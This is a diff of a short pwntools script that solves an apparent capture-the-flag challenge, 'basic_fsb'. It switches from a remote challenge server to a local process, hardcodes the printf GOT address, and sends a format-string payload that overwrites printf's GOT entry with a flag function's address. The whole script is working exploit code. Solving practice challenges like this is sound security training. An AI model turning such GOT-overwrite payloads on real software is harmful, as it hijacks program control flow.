@@ -1,14 +1,13 @@
 from pwn import *
 
-e = ELF("./basic_fsb")
-#p = process("./basic_fsb")
-r = remote("ctf.j0n9hyun.xyz", 3002)
-printf_got = e.got['printf']
-flag = 0x80485b4
+p = process("./basic_fsb")
+
 offset = 2
+flag = 0x80485b4
+printf_got = 0x804a00c
 
 payload = ''
 payload += fmtstr_payload(offset, {printf_got:flag})
+p.sendline(payload)
+p.interactive()
 
-r.sendline(payload)
-r.interactive()
